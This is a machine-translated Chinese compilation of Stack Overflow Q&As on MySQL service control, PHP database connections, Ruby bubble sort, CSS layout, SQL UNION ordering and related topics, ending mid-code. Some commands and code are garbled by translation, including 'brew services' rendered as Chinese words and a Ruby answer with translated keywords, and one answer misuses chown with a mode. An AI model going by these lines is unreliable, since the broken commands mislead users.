我使用此[链接](http://dev.mysql.com/doc/mysql-apt-repo-quick-guide/en/)解决了 Ubuntu 15.10 中 MySQL 5.6 的安装问题。

在此安装过程中，我遇到的问题是：

```
"mysqld_safe A mysqld process already exists" 
```

只要完全停止mysqld，mysqld_safe，mysql就解决了问题。

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2018-12-02T23:56:10.067

要在启动时停止 mysql 的自动启动，以下对我`8.0.12`使用 Homebrew 安装的 mysql 有用`macOS Mojave 10.14.1`：

```
rm -rf ~/Library/LaunchAgents/homebrew.mxcl.mysql.plist 
```

* * *

## 回答 #15

> 赞同：2
> 
> 时间：2018-01-18T06:15:12.850

如果我的 mysql 不断重启
`sudo rm -rf /usr/local/var/mysql/dev.work.err`
`mysql.server stop`
对我有用。

* * *

## 回答 #16

> 赞同：2
> 
> 时间：2019-04-15T13:31:00.857

停止 MariaDB 和 MySQL 服务器实例：

```
sudo mysqladmin shutdown 
```

启动 MariaDB 和 MySQL 服务器实例：

```
mysqld & 
```

要更改 MariaDB 和 MySQL 服务器实例的数据所有权：

```
sudo chown -R 755 /usr/local/mariadb/data 
```

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2021-05-05T04:55:53.223

1.  直接去任务管理器。
2.  然后在进程中，搜索 mysqld。
3.  右键单击mysqld，然后单击停止。
4.  通过此过程，您可以在不使用命令的情况下停止它。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2021-01-05T10:40:22.737

## 以下在我的 macbook pro 上为我工作：

> 酿造服务停止mysql

如果您想停止所有 brew 服务，请执行以下操作：

> 酿造服务停止--全部

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2019-01-25T22:54:41.620

对于从二进制文件下载到 MacOS 的 mysql 5.7：

```
sudo launchctl load -F /Library/LaunchDaemons/com.oracle.oss.mysql.mysqld.plist
sudo launchctl unload -F /Library/LaunchDaemons/com.oracle.oss.mysql.mysqld.plist 
```

* * *

## 回答 #20

> 赞同：-1
> 
> 时间：2018-12-20T15:43:35.530

# 对于 MAMP

1.  停止服务器（但您可能会注意到 MySQL 仍在运行）
2.  删除或重命名`/Applications/MAMP/tmp/mysql/`包含`mysql.pid`和文件的`mysql.sock.lock`文件
3.  当您返回 Mamp 时，您会看到 MySQL 现已关闭。您可以再次“启动服务器”。

# php - 使用php连接的SQL Server地址

> ID：11091421
> 
> 赞同：0
> 
> 时间：2012-06-18T21:34:14.063
> 
> 标签：php, sql-server-2008, sql-server-2012

我使用此代码连接到 SQL Server 2012，但它不起作用

```
<?php
$objConnect = mssql_connect("localhost","usr","pass"); 

if($objConnect)  
{  
  echo "Database Connected.<br />";  
  echo mssql_error();
}  
else  
{  
  echo "Database Connect Failed.<br />";
}  

mssql_close($objConnect);  
?> 
```

它总是打印`Database Connect Failed.`

另外，如何从外部 Web 服务器连接到本地 SQL Server？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T21:51:06.950

如果您的版本是 SQL Server Express，您可能应该使用：

```
$objConnect = mssql_connect("localhost\SQLEXPRESS","usr","pass"); 
```

或者如果它是一个命名实例，那么

```
$objConnect = mssql_connect("localhost\InstanceName","usr","pass"); 
```

如果您需要远程连接，那么显然您不应该使用`localhost`，因为远程 Web 服务器是如何定位*您的* `localhost`？您应该使用以下其中一项（假设远程 Web 服务器可以看到您的 IP 地址为 192.168.5.22 的机器）：

```
$objConnect = mssql_connect("192.168.5.22\SQLEXPRESS","usr","pass");
$objConnect = mssql_connect("192.168.5.22\NamedInstance","usr","pass");
$objConnect = mssql_connect("192.168.5.22","usr","pass"); 
```

当然，您的防火墙必须打开端口 1433（可能还有 1434）才能接受该连接，并且这里还有许多其他可能出错的地方。

不过，有一点调试 101 的建议。代替：

```
if($objConnect)  
{  
  echo "Database Connected.<br />";  
  echo mssql_error();
}  
else  
{  
  echo "Database Connect Failed.<br />";  
} 
```

为什么不：

```
if($objConnect)  
{
  echo "Database Connected.<br />";  
}  
else  
{  
  echo "Database Connect Failed.<br />";  
  echo mssql_error();
} 
```

当然，当数据库连接成功时，您不需要向页面写入错误。告诉我们您收到的实际错误消息可能会更好地让我们为您指明解决方案的方向。您编写的通用“数据库连接失败”消息不会向任何人提供有关实际问题的任何线索。但我敢打赌`mssql_error()`可能！

# java - 修正斐波那契数列的迭代版本

> ID：11091422
> 
> 赞同：2
> 
> 时间：2012-06-18T21:34:23.430
> 
> 标签：java, c++, math, sequence, fibonacci

我刚刚经历了斐波那契数列算法的迭代版本。我发现以下代码

```
int Fibonacci(int n)
{
   int f1 = 0;
   int f2 = 1;
   int fn;
   for ( int i = 2; i < n; i++ )
   {
      fn = f1 + f2;
      f1 = f2;
      f2 = fn;
   }
} 
```

一个愚蠢的问题刚刚出现在我的脑海中。上面的函数将前面的两个数字相加并返回第三个数字，然后为下一次迭代准备好变量。如果是这样的话会怎样。“返回一系列数字，它是前三个数字的总和”我们如何更改上面的代码来找到这样一个数字.u

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-18T21:38:07.950

作为提示，请注意上述算法通过一些变量“循环”数字来工作。在上面的代码中，在您存储的每一点

```
 F_0    F_1
  a      b 
```

然后，您在循环中将它们“移动”一步：

```
 F_1    F_2
  a      b 
```

然后在下一次循环迭代中再次“移动”它们：

```
 F_2    F_3
  a      b 
```

如果要更新算法总和最后*三个*值，请考虑像这样存储它们：

```
 T_0    T_1    T_2
  a      b      c 
```

然后再次移动它们：

```
 T_1    T_2    T_3
  a      b      c 
```

然后再次移动它们：

```
 T_2    T_3    T_4
  a      b      c 
```

将这种直觉转化为代码是一个很好的练习，所以我将把这些细节留给你。

也就是说 - 有一种*更快*的方法来计算斐波那契和“Tribonacci”序列的第 n 项。 [这篇文章](http://en.wikipedia.org/wiki/Recurrence_relation#Linear_homogeneous_recurrence_relations_with_constant_coefficients)描述了一个非常聪明的技巧，它使用矩阵乘法来比上面的循环更快地计算项，[这里](http://keithschwarz.com/interesting/code/?dir=recurrence)有实现这个算法的代码。

希望这可以帮助！

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-19T00:58:50.330

我喜欢递归。叫我虐待狂。

```
static int rTribonacci (int n, int a, int b, int c) {
    if (n == 0) return a;
    return rTribonacci (n-1, b, c, a + b + c);
}

int Tribonacci (int n) { return rTribonacci(n, 0, 0, 1); } 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-19T00:18:16.010

我通常不会回答像作业一样“闻起来”的问题，但由于其他人已经回答了这就是我会做的：

```
int Tribonacci(int n)
{
    int last[3] = { 0, 0, 1 }; // the start of our sequence

    for(int i = 3; i <= n; i++)
        last[i % 3] = last[i % 3] + last[(i + 1) % 3] + last[(i + 2) % 3];

    return last[n % 3];
} 
```

通过将循环更改为：

```
 for(int i = 3; i <= n; i++)
        last[i % 3] = last[0] + last[1] + last[2]; 
```

它可以进一步优化，坦率地说，有更好的方法来计算这样的序列，正如 templatetypedef 所说。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-02-07T19:01:40.563

如果要使用递归，则不需要任何其他参数：

```
int FibonacciN(int position)
{   if(position<0) throw new ArgumentException("invalid position");
    if(position==0 || position ==1) return position;
    return FibonacciN(position-1) + FibonacciN(position-2);
} 
```

# c# - 在为注册表项使用示例代码时遇到问题

> ID：11091424
> 
> 赞同：0
> 
> 时间：2012-06-18T21:34:30.200
> 
> 标签：c#, internet-explorer, registry

示例代码可以在这里找到：

[http://msdn.microsoft.com/en-us/library/cc197002(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/cc197002(v=vs.85).aspx)

代码大约在页面下方的三分之一处，就在“社区内容”下方“IERegCreateKeyEx 现在在 c# 中工作，请你帮忙 RegCloseKey”

谢谢你的帮助。我已经尝试了几天来使用它。它编译完美，但我无法调用公共静态类 ProtectedModeHelper 中公开的公共**SetRegValue**和**CreatRegKey函数。**

示例中可以使用任何 IE 键值；随意在示例中使用您自己的，例如`HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Settings`.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T23:36:21.220

由于您使用 C# 进行编程，因此您可以使用[RegistryKey 类](http://msdn.microsoft.com/en-us/library/microsoft.win32.registrykey.aspx)来执行此类任务。下面是来自[MSDN](http://msdn.microsoft.com/en-us/library/microsoft.win32.registrykey.aspx)的示例代码，展示了如何创建键并设置它们的值：

```
static void Main()
{
    // Create a subkey named Test9999 under HKEY_CURRENT_USER.
    RegistryKey test9999 = 
        Registry.CurrentUser.CreateSubKey("Test9999");
    // Create two subkeys under HKEY_CURRENT_USER\Test9999\. The
    // keys are disposed when execution exits the using statement.
    using(RegistryKey 
        testName = test9999.CreateSubKey("TestName"),
        testSettings = test9999.CreateSubKey("TestSettings"))
    {
        // Create data for the TestSettings subkey.
        testSettings.SetValue("Language", "French");
        testSettings.SetValue("Level", "Intermediate");
        testSettings.SetValue("ID", 123);
    }
} 
```

要修改现有密钥，您必须使用[RegistryKey.OpenSubKey 方法](http://msdn.microsoft.com/en-us/library/xthy8s8d.aspx)打开它，指定您希望将写入权限应用于密钥，然后您可以调用[SetValue](http://msdn.microsoft.com/en-us/library/2kk9bxk9.aspx)，如上所示。

# ruby - 在 Ruby 中对数组使用冒泡排序方法

> ID：11091434
> 
> 赞同：5
> 
> 时间：2012-06-18T21:35:09.493
> 
> 标签：ruby, bubble-sort

我正在尝试将冒泡排序方法实现为一个简单的 Ruby 编码问题，但我遇到了一些麻烦。我理解这个想法是查看第一个元素的值并将其与第二个元素的值进行比较，然后相应地交换它们，但我似乎无法在实际问题中做到这一点。有人愿意提供一个简短的例子来说明这在 Ruby 中是如何工作的吗？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-01-18T07:55:23.257

使用 while 循环正确实现冒泡排序

```
def bubble_sort(list)
  return list if list.size <= 1 # already sorted
  swapped = true
  while swapped do
    swapped = false
    0.upto(list.size-2) do |i|
      if list[i] > list[i+1]
        list[i], list[i+1] = list[i+1], list[i] # swap values
        swapped = true
      end
    end    
  end

  list
end 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-01-30T20:33:33.093

```
arr = [4,2,5,1]
loop until arr.each_cons(2).with_index.none?{|(x,y),i| arr[i],arr[i+1] = y,x if x > y}
p arr #=> [1, 2, 4, 5] 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-23T01:37:28.847

这是我的最佳答案版本。它只在数组上调用 size 一次，而不是每个循环。一旦元素移动到数组的末尾，它就不会比较元素。

while 循环会更快地退出一个循环。一旦你完成了整个阵列并且只进行了一次交换，你就完成了，所以不需要再进行 0 次交换。

```
def bubble_sort(list)
  iterations = list.size - 2

  return list unless iterations > 0 # already sorted

  swaps = 2

  while swaps > 1 do
    swaps = 0

    0.upto(iterations) do |i|
      if list[i] > list[i + 1]
        list[i], list[i + 1] = list[i + 1], list[i] # swap values
        swaps += 1
      end
    end

    iterations -= 1
  end

  list
end 
```

运行此测试所需的时间减少了 25%。

```
that_array = this_array = [22,66,4,44,5,7,392,22,8,77,33,118,99,6,1,62,29,14,139,2]
49.times {|variable| that_array = that_array + this_array}
bubble_sort that_array 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-06-18T21:38:39.667

[资源](http://www.dzone.com/snippets/bubble-sort-ruby)

```
def bubble_sort(list)
  return list if list.size <= 1 # already sorted

  loop do
    swapped = false
    0.upto(list.size-2) do |i|
      if list[i] > list[i+1]
        list[i], list[i+1] = list[i+1], list[i] # swap values
        swapped = true
      end
    end
    break unless swapped
  end

  list
end 
```

虽然我肯定会推荐比bubblesort运行时间更好的东西:)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-05-25T18:29:51.083

```
def bubble_sort array 
  array.each do
    swap_count = 0
    array.each_with_index do |a, index|
      break if index == (array.length - 1)
      if a > array[index+1]
        array[index],array[index+1] = array[index +1], array[index]
        swap_count += 1
      end
    end
    break if swap_count == 0 # this means it's ordered
  end
  array
end 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-06-18T23:42:58.313

只需重写 @VanDarg 的代码以使用 while 循环（注意：代码未经测试......运行后果自负）

```
def bubble_sort(list)
  return list if list.size <= 1 # already sorted

  swapped = true
  while swapped
    swapped = false # maybe this time, we won't find a swap
    0.upto(list.size-2) do |i|
      if list[i] > list[i+1]
        list[i], list[i+1] = list[i+1], list[i] # swap values
        swapped = true # found a swap... keep going
      end
    end
  end

  list
end 
```

**编辑：**更新了交换值，因为冒泡排序在仍然进行交换时继续排序 - 一旦发现没有更多交换，它就会停止排序。请注意，这不*遵循*@Doug 的代码，但符合@cLuv 的修复

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-06-25T13:05:07.460

老套

```
def bubble_sort(random_numbers)
for i in 0..random_numbers.size 
  for j in i+1..random_numbers.size-1    
    random_numbers[i], random_numbers[j] = random_numbers[j], random_numbers[i] if(random_numbers[i] > random_numbers[j])
  end
end
random_numbers
end 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-10-18T06:19:57.303

这是我的代码。我喜欢使用 (arr.length-1)。对于循环，您还可以使用诸如 until、while、for、upto、loop do 等迭代。有趣的是尝试不同的东西来看看它是如何工作的。

```
def bubble_sort(arr)  #10/17/13 took me 8mins to write it

return arr if arr.length <= 1

sorted = true

    while sorted
     sorted = false
     (arr.length-1).times do |i|
        if arr[i] > arr[i+1]
          arr[i], arr[i+1] = arr[i+1], arr[i]
          sorted = true
        end
       end
     end
    arr
    end 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2013-04-16T05:15:49.800

```
 def bubbleSort(list)
  sorted = false
  until sorted
    sorted = true
    for i in 0..(list.length - 2)
      if list[i] > list[i + 1]
        sorted = false
        list[i], list[i + 1] = list[i + 1], list[i]
      end
    end
  end
  return list
end 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2014-01-24T08:12:26.367

如果您不想使用这条有趣的交换线（IMO）：

```
 arr[i], arr[j] = arr[j], arr[i] 
```

这是我的看法：

```
def bubble_sort(arr)
  temp = 0

  arr.each do |i|
    i = 0
    j = 1
    while (j < arr.length)
      if arr[i] > arr[j]
        temp = arr[i] 
        arr[i] = arr[j]
        arr[j] = temp 
        p arr
      end
    i+=1
    j+=1
    end
  end  
 arr
end 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2015-01-26T11:18:21.417

```
类数组
a = [6, 5, 4, 3, 2, 1]
n = a.长度

对于 0..n-1 中的 j
    对于 i 在 0..n - 2 - j
           如果 a[i]>a[i+1]
                tmp = a[i]
                a[i] = a[i+1]
                a[i+1] = tmp
          结尾
     结尾
结尾

puts a.inspect
结尾

```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2014-09-11T10:29:28.167

**这是我使用运算符 XOR 的结果：**

```
def bubble(arr)
     n = arr.size - 1
     k = 1
     loop do
          swapped = false
          0.upto(n-k) do |i|
              if arr[i] > arr[i+1]
                 xor = arr[i]^arr[i+1]
                 arr[i] = xor^arr[i]
                 arr[i+1] = xor^arr[i+1]
                 swapped = true  
              end 
          end 
          break unless swapped
          k +=1 
     end
   return arr
end 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2013-05-26T07:51:03.090

直截了当：

```
def bubble_sort(n)
  return n if n.length <= 1

  0.upto(n.length - 1) do |t|
    0.upto(n.length - 2 - t) do |i|
      if n[i] > n[i + 1]
        n[i], n[i + 1] = n[i + 1], n[i]
      end
    end
  end

  n
end 
```

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2016-08-13T00:29:57.003

另一个，稍微不同的命名。

```
def bubble_sort(list)
  return list if list.size <= 1
  not_sorted = true

  while not_sorted
    not_sorted = false

    0.upto(list.size - 2) do |i|
      if list[i] > list[i + 1]
        list[i], list[i + 1] = list[i + 1], list[i]
        not_sorted = true
      end
    end
  end
  list
end 
```

# jquery - jQuery slideToggle 销毁 iframe

> ID：11091438
> 
> 赞同：0
> 
> 时间：2012-06-18T21:35:21.157
> 
> 标签：jquery, css, slidetoggle

考虑到我正在使用的项目，在这里发布所有代码是不可能的，但是这里是一般情况。

我有一个使用 JQuery 折叠的 div 标签，如下所示：

```
$(".div_class").click(function(){
    $("div#div_name").slideToggle()
}); 
```

此函数会影响页面稍后的 IFrame。

```
<iframe frameborder="0" id="iframe_id" name="iframe_name" height="100%" width="100%" src="google.com"></iframe> 
```

这是问题所在，我的 div 包含和 IFrame，当框重新展开时，它不会显示 IFrame。更奇怪的是，如果我右键单击框的底部，并使用萤火虫检查元素，它会在一瞬间将屏幕随机播放，并且 IFrame 将再次显示。

澄清一下，滑块不会直接影响 IFrame，它会折叠封装 iframe 的 div。

已经尝试将 IFrame css 'display' 设置为 'block' 这似乎是 JQuery 函数正在执行的操作的要点，但它没有解决。还尝试添加到 JQuery 函数并在单击后插入新的 IFrame，但这也失败了。

提前感谢您的任何意见。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T22:08:20.277

我的猜测是 iframe 上的 height="100%" 并没有真正做到 100% 的内容。高度 100% 意味着它将“传播”在父级的高度上，但我认为你需要的是内容的高度。尝试设置一个固定高度，看看是否会出现同样的问题。

同样，您可能会考虑[jQuery.get](http://api.jquery.com/jQuery.get/)。

# php - sed -i 在 php shell_exec() 中不起作用

> ID：11091440
> 
> 赞同：0
> 
> 时间：2012-06-18T21:35:47.663
> 
> 标签：php, apache, bash, sed, shell-exec

我希望能够在 php 文件中使用 shell_exec() 远程删除/添加开发横幅。从 php/apache 运行时，sed -i 函数不起作用。SELINUX 被禁用。以另一个用户身份从终端运行 test.sh 就可以了。浏览器返回以下内容：

```
 Reset/Set Environments

    Running now...
    /sbin/nologin
    sed is /bin/sed
    sed: couldn't open temporary file /var/www/html/folder/folder/folderwithoutwritepermission/sed63Klhk: Permission denied
    EOF 
```

这是代码：

PHP 文件：

```
<!DOCTYPE HTML> 
<html> 
<head> 
    <title>Reset/Set Environments</title> 
    <meta http-equiv="content-type" content="text/html; charset=UTF-8"> 
</head> 
<body> 

<h1>Reset/Set Environments</h1>

<?php

$output = shell_exec('sh /var/www/html/pages/test.sh');
echo("<pre>{$output}</pre>");

?>

</body> 
</html> 
```

测试.sh：

```
#!/bin/bash

cd /var/www/html/pages/;

echo "Running now...";

echo $SHELL;

type -a sed;

find -L /var/www/html/ -name 'template.php' 2>&1 | xargs sed -i 's/<body>/<body><div style=\"position: fixed; padding: 14px; background-color: #00ff00; width:100%; opacity: 0.5;\"><span style=\"color: #009900; font-size: 14px; font-weight: bold;\">DEVELOPMENT ENVIRONMENT<\/span><\/div>/g' 2>&1

echo "EOF"; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T23:36:48.437

问题是运行 apache 的用户帐户的 shell 设置为`/bin/nologin`

请参阅[http://www.cyberciti.biz/tips/howto-linux-shell-restricting-access.html](http://www.cyberciti.biz/tips/howto-linux-shell-restricting-access.html)

# ruby-on-rails - 使用 Capistrano 部署 Rails 应用程序时遇到问题

> ID：11091442
> 
> 赞同：-1
> 
> 时间：2012-06-18T21:35:51.090
> 
> 标签：ruby-on-rails, capistrano, vps

我一直在构建我的第一个 Rails 应用程序，现在我正在尝试部署它，我一直在按照[这些说明](http://coding.smashingmagazine.com/2011/06/28/setup-a-ubuntu-vps-for-hosting-ruby-on-rails-applications-2/)进行操作，这些说明在它告诉我运行时效果很好`cap deploy:setup`，因为我收到了这条消息：

```
[err :: my.vps.ip.address] bash: /root/.rvm/bin/rvm-shell: No such file or directory

failed: "rvm_path=$HOME/.rvm/ $HOME/.rvm/bin/rvm-shell 'default' -c 'mkdir -p var/rails/test_app/current var/rails/test_app/current/releases var/rails/test_app/current/shared var/rails/test_app/current/shared/system var/rails/test_app/current/shared/log var/rails/test_app/current/shared/pids'" on my.vps.ip.address 
```

我环顾四周试图找到问题的解决方案，我尝试了其中一些但没有成功，老实说，我根本不明白这个错误意味着什么，所以我会如果有人可以提供帮助，或者只是向我解释它告诉我的内容，将不胜感激。

如果我需要提供任何其他信息，请告诉我，我确定有，但我不知道。

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T21:42:16.267

看起来您正试图以 root 身份登录到服务器。您是否在服务器上设置了另一个用户？此外，请检查您的 capistrano deploy.rb 以获取用户信息。

# java - 如何从 GWT DataGrid 中的列标题中删除文本阴影？

> ID：11091447
> 
> 赞同：0
> 
> 时间：2012-06-18T21:36:12.283
> 
> 标签：java, css, gwt, datagrid

我一直在尝试覆盖用于从 GWT DataGrid 列标题定义默认文本阴影的 CSS。根据 Google 的说法，CSS 是在 DataGrid.css 中定义的，但覆盖`.dataGridHeader`其中定义的类没有任何效果。在 CSS 文件中，默认行为定义为：

```
.dataGridHeader {
 border-bottom: 2px solid #6f7277;
 padding: 3px 15px;
 text-align: left;
 color: #4b4a4a;
 text-shadow: #ddf 1px 1px 0;
 overflow: hidden;
 white-space: nowrap;
} 
```

在模块 CSS 中覆盖这个类没有效果。

有趣的是，我确实在其他地方发现，通过覆盖 .x-grid3 CSS 类可以成功更改其他行为。例如，行高可以设置如下：

```
.myRowHeight .x-grid3-row { height: 30px; } 
```

这通过调用实例`.addStyleName()`上的方法应用于网格实例。

这表明 DataGrid 的实现毕竟没有使用 DataGrid.css，而且 Google 的文档是错误的。我不熟悉 .x-grid3 CSS，所以不确定哪个类会被覆盖以删除文本阴影。

顺便说一句，我确实了解 CSS 注入路线，但我想了解为什么 .x-grid3 覆盖适用于行高，以及不同的覆盖是否可以解决我的问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T09:39:04.513

你是如何覆盖这个 css 的？您是否只是将`.dataGridHeader`类添加到您自己的 css 样式表中？请看一下这个[问题](https://stackoverflow.com/a/10878147/405492)，详细说明如何正确覆盖 DataGrid 的 css。这是一个反复出现的问题，已在 SO 上多次回答。

# html - 不知道如何做到这一点.. 4 段文本均匀分布在页面上？

> ID：11091449
> 
> 赞同：0
> 
> 时间：2012-06-18T21:36:17.043
> 
> 标签：html, css, text, tabular

我想在页面上均匀显示 4 小段文本。这是我想到的图像：

![理想的](../Images/4066238c888f4887857bbc16bb036354.png)

有些东西告诉我桌子是最好的选择，但是a）我一直被告知不要使用它们，b）因此，如果这实际上是最好的方法，我不知道该怎么做.

我愿意接受建议；任何和所有的帮助表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:47:05.930

我相信这样的事情会起作用：

### CSS：

```
html, body 
{
    width: 100%;
    padding: 0px;
    margin: 0px;
    border: none;
}
div.content
{
    float: left;
    vertical-align: top;
    margin: 0px;
    padding: 0px;
    width: 25%;
 } 
```

### HTML：

```
<div class="content">Blah</div><div class="content">blah blah</div>
<div class="content">Blah Blah</div><div class="content">blah blah blah blah</div> 
```

看到[这个 jsFiddle](http://jsfiddle.net/plowdawg/5FSDZ/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T21:55:49.620

Travis 的很好，这个版本给了你更多的工作空间，并且可以让你拨入块之间的填充。背景颜色就在那里，你可以看看它是如何工作的。

CSS：

```
.testimonials {
border:1px solid black;
}
.testimonial {
    float:left;
    width:25%;
    background-color:#ccc;
}
.testimonial blockqoute {
    display:block;
    padding:20px;
    background-color:yellow;
    font-style:italic;
}
.testimonial attr {
    display:block;
    font-style:normal;
}
.clear {
    clear:both;
} 
```

HTML：

```
<div class="testimonials">
    <h3>Client Testimonials</h3>
    <div class="testimonial">
        <blockqoute>Blah blah...
            <attr>John Smith <br/>
                boomboom.com</attr>
        </blockqoute>
    </div>
    <div class="testimonial">
        <blockqoute>Blah blah...
            <attr>John Smith <br/>
                boomboom.com</attr>
        </blockqoute>
    </div>
    <div class="testimonial">
        <blockqoute>Blah blah...
            <attr>John Smith <br/>
                boomboom.com</attr>
        </blockqoute>
    </div>
    <div class="testimonial">
        <blockqoute>Blah blah...
            <attr>John Smith <br/>
                boomboom.com</attr>
        </blockqoute>
    </div>
    <div class="clear"></div>
</div> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-18T23:06:12.973

我会做这样的事情。如果您不想要液体布局，只需将百分比替换为像素即可。

CSS：

```
* {
   box-sizing:border-box;
   -moz-box-sizing:border-box; /* Firefox */
   -webkit-box-sizing:border-box; /* Safari */
}

#container {
   width: 80%; 
   margin: 0px auto;
}
#container div {
   width: 25%; /* 25% percent of the #container width */
   padding: 10px; 
   float: left
} 
```

HTML：

```
<div id="container">
  <div>Content 1</div>
  <div>Content 2</div>
  <div>Content 3</div>
  <div>Content 4</div>
</div> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-18T22:17:09.183

HTML

```
<div id="content">
<h1>title</h1>
<div class="text_tontent">
   <p>Lorem ipsum dolor sit amet</p>
</div>
<div class="text_tontent">
   <p>Lorem ipsum dolor sit amet</p>
</div>
<div class="text_tontent">
   <p>Lorem ipsum dolor sit amet</p>
</div>
<div class="text_tontent">
   <p>Lorem ipsum dolor sit amet</p>
</div> 
```

CSS

```
'#content {width:100%; overflow:auto; padding:20px 0}<br />
.text_tontent {width:25%; float:left;}<br />
.text_tontent p {padding:0 10px;}<br />' 
```

# php - 使用 ORDER BY 跨 3 个表的 MYSQL UNION

> ID：11091450
> 
> 赞同：1
> 
> 时间：2012-06-18T21:36:21.883
> 
> 标签：php, mysql

我们有这样的声明：

```
(SELECT res_bev.bev_id, property_value.name AS priority 
    FROM res_bev, bev_property, property_value 
    WHERE res_bev.res_id='$resIn'
        AND bev_property.bev_id=res_bev.bev_id
        AND bev_property.type_id='23'
        AND property_value.id=bev_property.val_id)
UNION
(SELECT res_bev.bev_id, property_value.name as priority 
    FROM res_bev, bev_property, property_value 
    WHERE res_bev.res_id='$resIn' 
        AND bev_property.bev_id=res_bev.bev_id 
        AND bev_property.type_id='22' 
        AND property_value.id=bev_property.val_id) 
```

我们有三个表：

> *res_bev*
> res_id | bev_id | ID
> 
> *Bev_property*
> type_id | val_id | bev_id | ID
> 
> *属性值*
> 名称 | ID

我正在寻找的是按 glass price(type_id='23') 然后按 bottle price(type_id='22') 订购的结果，但似乎联盟包含重复项，因为第一个选择返回说`3456 | 7.5`，第二个返回`3456 | 55`因为 price/Glass 是 7.5，price/Bottle 是 55；**如何从要返回的第二个 SQL 语句和有序表中消除这些重复项？**

此外，通过左连接创建一个伪表来创建一个表被愚弄了`bev_id | price/Glass | price/Bottle`，但是由于这应该能够扩展到多种价格类型，我认为 UNION 会更有效。只需朝着正确的方向推动就会有所帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:58:34.380

您可以通过指定 bev_property.type_id 在 1 个查询中执行此操作，以匹配具有内部值的 IN() 子句。

要只返回找到的第一个，您应该需要一个[DISTINCT SELECT](http://dev.mysql.com/doc/refman/5.0/en/select.html)的伴随字段`bev_id`。

要对它们进行排序，只需添加适当的降序 ORDER BY 子句。这应该首先排序并过滤掉第二个`bev_property.type_id`值。（数据库永远不会以特定顺序返回任何内容，除非您告诉他们这样做，有些可能有内部约定，或者看起来确实如此，但除非您`ORDER BY`在语句中指定子句，否则这永远不能保证是可重复的`SELECT`。）

```
SELECT DISTINCT res_bev.bev_id, property_value.name AS priority 
FROM res_bev, bev_property, property_value 
WHERE res_bev.res_id='$resIn'
    AND bev_property.bev_id=res_bev.bev_id
    AND bev_property.type_id IN ('23','22')
    AND property_value.id=bev_property.val_id
ORDER BY bev_property.type_id DESC; 
```

UNION 并不会真正更快，因为您必须进行两次整个查找，并且如果您没有索引该字段，那么您将执行整个表遍历，匹配 1 个元素两次而不是 1 个表遍历与 2 个元素匹配。（走过整张桌子通常很慢，不匹配简单的元素）

正确索引后，我认为您可能会在执行新的选择查询和再次运行查询分析器时产生很小的开销，但我不确定。它可能足够聪明，可以识别查询之间的相似性，所以这无关紧要。

不过，尝试特定的数据库并不总是有害的。每当您尝试使用不同的语句进行[查询优化](http://dev.mysql.com/doc/refman/5.6/en/using-explain.html)时，将它们与[EXPLAIN](http://dev.mysql.com/doc/refman/5.6/en/explain.html)一起使用，这将向您显示查询将执行的操作以及它是否会遍历整个表、对文件中的数据进行排序等...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T22:02:18.977

除非我遗漏了什么，或者你的问题

```
SELECT res_bev.bev_id, 
       property_value.name AS priority 
FROM res_bev, bev_property, property_value 
WHERE res_bev.res_id='$resIn' 
AND bev_property.bev_id=res_bev.bev_id 
AND (bev_property.type_id='23' OR bev_property.type_id='22')
AND property_value.id=bev_property.val_id)
order by bev_property.type_id desc 
```

PS如果你想订购一个工会

尝试一些类似的东西

```
Select * from
(
select ...
Union
select ...
) somenameforqryinparentheses
Order by Somecolumn1, somecolumn2 
```

# java - 如何在调度更多事件之前等待 JOptionPane 关闭

> ID：11091457
> 
> 赞同：1
> 
> 时间：2012-06-18T21:36:43.257
> 
> 标签：java, swing, overriding, joptionpane, event-dispatch-thread

我有几个文本字段，我在它们之间切换。在`focusLost()`我打开一个`JOptionPane`. 我希望在关闭`focusGained()`后执行代码。`JOptionPane`即使对话框是模态的，也在关闭`focusGained()`之前被调用。`JOptionPane`有没有办法解决？

发现了这个类似的问题，但似乎也没有解决。 [焦点丢失后推迟事件队列](https://stackoverflow.com/questions/9275912/postpone-event-queue-after-focus-lost)

这是一个代码示例。您会注意到在 JOptionPane 关闭之前打印了“Focus Gained”。

```
import java.awt.event.FocusEvent;
import java.awt.event.FocusListener;
import javax.swing.BoxLayout;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JTextField;

public class ShortTest implements FocusListener
{
private void go()
{
    JFrame frame = new JFrame();
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

